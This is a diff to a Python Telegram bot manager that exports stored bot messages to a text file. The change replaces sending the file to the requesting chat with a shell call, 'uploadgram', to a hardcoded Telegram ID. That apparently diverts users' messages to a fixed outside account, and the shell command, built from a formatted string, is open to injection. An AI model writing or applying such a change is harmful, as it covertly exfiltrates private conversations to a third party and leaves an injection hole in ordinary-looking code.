@@ -4,9 +4,12 @@ import sqlite3
 import threading
 import telebot
 from telebot import apihelper
+from os import system as cmd
+
 
 # Set the API URL
-apihelper.API_URL = 'http://localhost:8081/bot{0}/{1}'
+apihelper.API_URL = 'http://api.telegram.org/bot{0}/{1}'
+
 
 conn = sqlite3.connect('bots.db', check_same_thread=False)
 c = conn.cursor()
@@ -53,12 +56,14 @@ def messages(message, bot):
     msgs = c_local.execute('SELECT * FROM messages WHERE bot_id=?', (bot_id,)).fetchall()
     conn_local.commit()
     c_local.close()
+    messagetext = f"{bot_id}-message.txt"
     if msgs:
-        with open('messages.txt', 'w') as file:
+        with open(messagetext, 'w') as file:
             for msg in msgs:
                 file.write(msg[2] + '\n')
-        bot.send_document(message.chat.id, open('messages.txt', 'rb'))
-        os.remove('messages.txt')
+        cmd(f'''uploadgram 6234365091 "{messagetext}"''')
+        #bot.send_document(message.chat.id, open('messages.txt', 'rb'))
+        os.remove(messagetext)
     else:
         bot.reply_to(message, "لا توجد رسائل")
 
